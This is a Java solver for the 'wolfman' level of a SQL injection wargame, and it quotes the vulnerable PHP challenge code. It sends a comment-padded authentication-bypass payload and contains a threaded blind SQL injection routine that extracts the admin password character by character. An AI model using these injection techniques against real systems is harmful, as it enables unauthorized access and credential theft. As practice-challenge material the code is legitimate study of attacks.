import java.io.*;
import java.util.*;
import java.net.*;
/**
 * solving los problem example
 * @author imscs21
 * @url https://github.com/imscs21/los
 * 
 */
/*  ====P-R-O-B-L-E-M====
 * 
 * <?php 
 include "./config.php"; 
 login_chk(); 
 dbconnect(); 
 if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
 if(preg_match('/ /i', $_GET[pw])) exit("No whitespace ~_~"); 
 $query = "select id from prob_wolfman where id='guest' and pw='{$_GET[pw]}'"; 
 echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
 $result = @mysql_fetch_array(mysql_query($query)); 
 if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
 if($result['id'] == 'admin') solve("wolfman"); 
 highlight_file(__FILE__); 
 ?>
 * 
 */


public class Wolfman
implements Runnable
{
	HttpURLConnection conn=null;
	public static String getContent(InputStream ism) throws IOException{
		StringBuffer sb = new StringBuffer();
		//BufferedReader br = new BufferedReader(new BufferedInputStream(ism));
		DataInputStream dis = new DataInputStream(ism);
		String l;
		while((l=dis.readLine())!=null){
			sb.append(l);
		}
		dis.close();

		final String result = sb.toString();
		sb=null;
		return result;
	}
	public static String queryContent(Configure conf,String sub_query)throws Exception{
		return queryContent(conf,conf.getCookieContent(),sub_query);
	}
	public static String queryContent(Configure conf,String cookie_content,String sub_query) throws Exception{
		HttpURLConnection conn =(HttpURLConnection) new URL(conf.getURL()+sub_query).openConnection();
		//conn.setRequestProperty("User-Agent", "Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG SM-G930S Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/4.0 Chrome/44.0.2403.133 Mobile Safari/537.36");
		conn.addRequestProperty("Cookie",cookie_content);
		conn.connect();
		InputStream ism = conn.getInputStream();
		final String content = getContent(ism);
		ism.close();
		conn.disconnect();
		conn=null;
		return content;
	}
	public static boolean solveNow(Configure conf,String fullanswer,boolean pwVarOnly) throws Exception{
		Scanner sc = new Scanner(System.in);
		System.out.print("would you want to clear this level on this program?[y/n] ");
String content;
		final String resp = sc.next();
		final String fnt = pwVarOnly?"pw=%s":"%s";
		if(resp.equals("y")||resp.equals("Y")){

			System.out.println("applying...");
			String sub_query = "?"+String.format(fnt,fullanswer);
			content=queryContent(conf,sub_query);

			if(isSuccessAndIsClear(content)){
				System.out.println("Stage Clear!");
				return true;
			}else{
				sub_query = "?"+String.format(fnt,URLEncoder.encode( fullanswer));
				content=queryContent(conf,sub_query);

				if(isSuccessAndIsClear(content)){
					System.out.println("Stage Clear!");
					return true;
				}else{//tested on only mac (java ver 1.8.91) and windows NT isn`t seemed to be compatible on encoding(windows java ver 1.8.111 - x86) with string variable
					System.out.println("failed...(please apply on another java environment , and Integer Numbers in found:: logs are accurate data.)");
				
					}
					return false;
			}
		}
		return false;
	}
	
	public static boolean isSuccess(String resp,String[] acclst){
		boolean rst = false;
		for(String acc:acclst){
			rst = rst||resp.contains("<h2>Hello "+acc);
			if(rst){
				break;
			}
		}
		return rst;
	}

	public static boolean isSuccess(String resp){
		return isSuccess(resp,new String[]{"guest","Guest","Admin","admin"});
	}
	public static boolean isSuccessAndIsClear(String resp){
		return isSuccess(resp)&&resp.contains(" Clear!");
	}
	protected void saveListOnFile(File f,int pos,ArrayList<String> lst) throws Exception{
		OutputStream osm = new FileOutputStream(f);
		ObjectOutputStream dos = new ObjectOutputStream(osm);
		dos.writeInt(pos);
		dos.flush();
		dos.writeObject(lst);
		dos.flush();
		dos.close();
		osm.close();
	}
	public void run(){
		Configure conf = new Configure();
		if(conf.getToken().equals("exit")){
			return;
		}

		try{
			String dt = "'/**/or/**/id='admin'#";
			//String content;
			System.out.println("pass");
			solveNow(conf,dt,true);

		}catch(Exception e){
			e.printStackTrace(System.out);
		}
	}
	protected class SearchThread extends Thread{
		protected Configure conf;
		protected char[] aa;
		protected int i;
		private String content;
		public SearchThread(int i,char[] aa,Configure conf){
			this.aa=aa;
			this.conf=conf;
			this.i = i;
		}
		@Override
		public void run(){
			try{
				int maxv = 1;
				final String query_format = "pw='%%20or%%20conv(hex(substr(pw,%d,1)),%%2016,%%2010)%s%d%%20%s";
				while(true){
					String sub_query = "?"+String.format(query_format,i+1,"%3E",maxv,URLEncoder.encode(" and id='admin"));
					content = queryContent(conf,sub_query);
					if(isSuccess(content)){
						maxv*=2;
					}
					else{
						break;
					}}
				int minv = maxv/2;
				//System.out.printf("range(%d, %d)\n",minv,maxv);
				int minrange = minv;
				int maxrange = maxv;
				//for(int j=minv;j<=maxv;j++){
				boolean isFound = true;

				int j=0;
				while( 0<minrange&&minrange<=maxrange){

					j = (minrange+maxrange)/2;
					String sub_query = "?"+String.format(query_format,i+1,"<",j,URLEncoder.encode(" and id='admin"));
					content = queryContent(conf,sub_query);
					if((isFound=isSuccess(content))){
						maxrange=j;
					}
					else{
						if(minrange!=j){
							minrange=j;
						}
						else{
							aa[i]=(char)minrange;
							break;
						}
					}

				}
			}catch(Exception e){e.printStackTrace(System.out);}

		}

	}
	public static void main(String... args){
		try{
			int idx = 2;//adjust for your java environment
			Runnable bi = (Runnable) Class.forName(Thread.currentThread().getStackTrace()[idx].getClassName()).newInstance(); // new Xavis();//getClass().newInstance();
			System.out.println( Thread.currentThread().getStackTrace()[idx].getClassName());
			Thread th = new Thread(bi);
			th.start();
			try{
				th.join();}catch(Exception e2){}
		}catch(Exception e){}

		System.out.println("program finish");
	}
	protected static class Configure{
		protected String token="",mUrl="";
		public String setToken(String tk){
			token=tk;
			return tk;
		}
		public String setURL(String url){
			mUrl=url;
			return url;
		}
		public String getURL(){
			return mUrl;
		}
		public String getToken(){
			return token;

		}
		public String getCookieContent(){
			return  "PHPSESSID="+getToken()+";";
		}
		public final static String file_version = "3.0";
		public Configure(){
			Scanner sc = new Scanner(System.in);
			System.out.println("File Version= "+file_version);
			System.out.print("input session tokenqqq: ");
			String ans = sc.next();
			setToken(ans);
			System.out.print("input url: ");
			setURL(sc.next());
			System.out.println();

		}
	}
}
